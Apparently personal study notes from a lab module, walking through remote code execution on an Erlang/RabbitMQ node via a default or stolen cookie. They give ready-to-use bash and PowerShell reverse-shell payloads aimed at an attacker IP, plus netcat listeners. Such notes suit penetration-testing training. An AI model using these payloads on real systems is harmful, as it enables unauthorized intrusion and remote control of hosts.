---
title: 25672 - Erlang Port
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - erlang
  - port
  - 25672
---
# 25672 - Erlang Port

!!! tip "Source of this note"
	- [https://malicious.link/posts/2018/erlang-arce/](https://malicious.link/posts/2018/erlang-arce/)
	- [HTB module](https://academy.hackthebox.com/module/67/section/926)

!!! warning ""
	 By running this code execution method you are running a node as well, as as long as you have the connection open, you can be exploited the same way you are exploiting the remote host.


---

## 📌 Overview

Erlang is a programming language designed around distributed computing and will have a network port that allows other Erlang nodes to join the cluster. The secret to join this cluster is called a cookie. Many applications that utilize Erlang will either use a weak cookie (RabbitMQ uses `rabbit` by default) or place the cookie in a configuration file that is not well protected. Some example Erlang applications are SolarWinds, RabbitMQ, and CouchDB.


### 🕵️‍♂️ Exploitation Scenario

- **Target Machine:** `10.129.101.49`
- **Attacker Machine (Kali):** `10.10.14.49`
- **Goal:** Achieve a **reverse shell** instead of opening an application (e.g., `calc.exe`).

---

## 🔍 Step 1: Locate or Guess the Erlang Cookie

Erlang uses a **cookie** as an authentication mechanism between nodes. It is stored in a file named `.erlang.cookie`.

### 📌 Common Locations:

- **Linux:** `~/.erlang.cookie`
- **Windows:** `C:\ProgramData\.erlang.cookie`

If you have access to the target filesystem, retrieve the cookie and place it in your home directory on Kali:

```bash
echo "retrieved_cookie_value" > ~/.erlang.cookie
chmod 400 ~/.erlang.cookie
```

If you don’t have direct file access, try common default values such as `rabbit`.

---

## 🔍 Step 2: Identify the Erlang Node Name

The target Erlang node name typically follows the format:

```
<cluster_name>@<hostname>
```

For RabbitMQ, the **cluster name** is often `rabbit`. If unknown, it may be guessable. The **hostname** may be derived from the system’s actual name. You can check DNS or `/etc/hosts` to resolve it.

Assuming:

- The **cluster name** is `rabbit`
- The **hostname** is `erlanghost`

Then, the full **node name** would be:

```
rabbit@erlanghost
```

---

## 🔍 Step 3: Start an Erlang Node on Kali

First, install Erlang if it's not already installed:

```bash
apt install erlang -y
```

Then, start an Erlang shell on your Kali machine:

```bash
erl -sname kali
```

---

## 🔍 Step 4: Connect to the Target Erlang Node

Inside the Erlang shell, connect to the target (adjusting the node name as necessary):

```erlang
net_kernel:connect('rabbit@erlanghost').
```

If successful, you are now part of the Erlang cluster and can execute remote commands.

---

## 🔍 Step 5: Achieve a Reverse Shell

Now, execute a command to get a **reverse shell**:

```erlang
erlang:spawn('rabbit@erlanghost', os, cmd, ["/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.49/4444 0>&1'"]).
```

Before running the command, set up a listener on your **Kali machine**:

```bash
nc -lvnp 4444
```

Once the payload executes, you should receive a **reverse shell**.

---

## 🔍 Step 6: Exit the Erlang Shell

To exit the Erlang shell cleanly, use:

```erlang
init:stop().
```

---

## 🔍 Notes & Considerations

- Ensure your **firewall** allows incoming connections on **port 4444**.
- If the target is a **Windows system**, adjust the payload to use `cmd.exe /c` and PowerShell techniques.
- If the connection fails, confirm the **cookie value** and **node name**.
- Be cautious: As long as you maintain the connection, your own **Kali machine can also be exploited**.

---

## 🔍 Windows Reverse Shell Alternative

If the target is a **Windows machine**, you can try this **PowerShell reverse shell** instead:

```erlang
erlang:spawn('rabbit@erlanghost', os, cmd, ["powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.49',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""]).
```

Set up the listener in Kali as before:

```bash
nc -lvnp 4444
```

---

## 🔍 Summary

|**Step**|**Action**|
|---|---|
|**1**|Find or guess the Erlang cookie (`.erlang.cookie`)|
|**2**|Identify the Erlang node name (`rabbit@erlanghost`)|
|**3**|Start an Erlang node on Kali (`erl -sname kali`)|
|**4**|Connect to the target (`net_kernel:connect('rabbit@erlanghost').`)|
|**5**|Execute reverse shell (`erlang:spawn(...)`)|
|**6**|Clean exit (`init:stop().`)|

---

## 🔍 Additional Resources

- [Erlang RCE Exploitation](https://malicious.link/posts/2018/erlang-arce/)
- [HTB Academy - Exploiting Erlang](https://academy.hackthebox.com/module/67/section/926)
- [RabbitMQ Clustering Guide](https://www.rabbitmq.com/clustering.html)

This method provides **remote command execution** on an **Erlang node** by leveraging its **distributed computing capabilities**.